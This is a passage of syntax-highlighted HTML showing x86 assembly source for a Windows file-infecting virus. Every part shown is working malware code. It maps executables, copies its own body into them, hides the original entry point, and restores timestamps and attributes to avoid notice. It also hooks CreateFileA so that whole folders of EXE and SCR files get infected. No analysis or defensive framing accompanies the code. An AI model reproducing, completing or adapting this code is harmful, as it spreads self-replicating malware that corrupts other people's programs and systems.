        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; phys size last sect</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; plus phys offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">PADDING</span><span class="sc0">                     </span><span class="sc1">; calc file padding</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pad</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pad</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorClose</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pad</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_MapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorCloseMap</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                                                </span><span class="sc1">; fill padding with zeroes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; coz the data that fills</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pad</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; the file grow will be</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; random of win swap/mem</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; contents or something</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; like...</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
        
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">vBegin</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">; update self CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">vSize</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hostEP</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; hide host entry point</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vSize</span><span class="sc0">                       </span><span class="sc1">; copy the baby</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">vBegin</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">epAddr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">infectionErrorCloseMap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileTime2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileTime1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileTime0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetFileTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">infectionErrorClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">infectionErrorAttrib</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileAttrib</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fNameAddr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetFileAttributesA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">infectionError</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; search stringz</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; esi: string to search</span><span class="sc0">
</span><span class="sc1">; ecx: size of string</span><span class="sc0">
</span><span class="sc1">; eax: where to search</span><span class="sc0">
</span><span class="sc1">; edx: buffer size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">searchStringz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">scanFileLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">scanFileNotFound</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">scanFileFound</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">scanFileLoop</span><span class="sc0">

</span><span class="sc5">scanFileNotFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">scanFileFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Our CreateFileA hook.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CreateFileAHook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getDelta</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000001h</span><span class="sc0">                    </span><span class="sc1">; for reentrance fix</span><span class="sc0">
</span><span class="sc5">multiThread</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">busy</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">multiThread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; set to busy</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get filename</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; check filename!=NULL</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">flee</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; goto end of string</span><span class="sc0">
</span><span class="sc5">getExt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">checkExt</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">getExt</span><span class="sc0">
</span><span class="sc5">checkExt</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;        @debug  "File found",esi                ; debug code</span><span class="sc0">

</span><span class="sc5">folderLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">endFolder</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">flee</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">folderLoop</span><span class="sc0">
</span><span class="sc5">endFolder</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">buffer1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">;        @debug  "Folder found",esi              ; debug code</span><span class="sc0">

        </span><span class="sc1">; ignore Set/Get directory errors, don't care</span><span class="sc0">
        </span><span class="sc1">; sometimes change dir won't be necessary, but i ever</span><span class="sc0">
        </span><span class="sc1">; try it</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXSTRING</span><span class="sc0">                       </span><span class="sc1">; get current directory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; goto found folder</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infectFolder</span><span class="sc0">                    </span><span class="sc1">; uh uh</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">; go back home</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">flee</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">multiThread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; set to available</span><span class="sc0">
</span><span class="sc5">busy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">CFAhookRet</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infects PE files in current directory. It affects EXE and SCR exts.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infectFolder</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">find_data</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">               </span><span class="sc1">; find first file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">fndMask</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">notFound</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">findHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">findNext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">find_data.cFileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">foundFilenameLen</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; get string len</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">filenameLenOk</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">foundFilenameLen</span><span class="sc0">
</span><span class="sc5">filenameLenOk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; test the string it's</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; long enought</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jna</span><span class="sc0">     </span><span class="sc5">skipThisFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
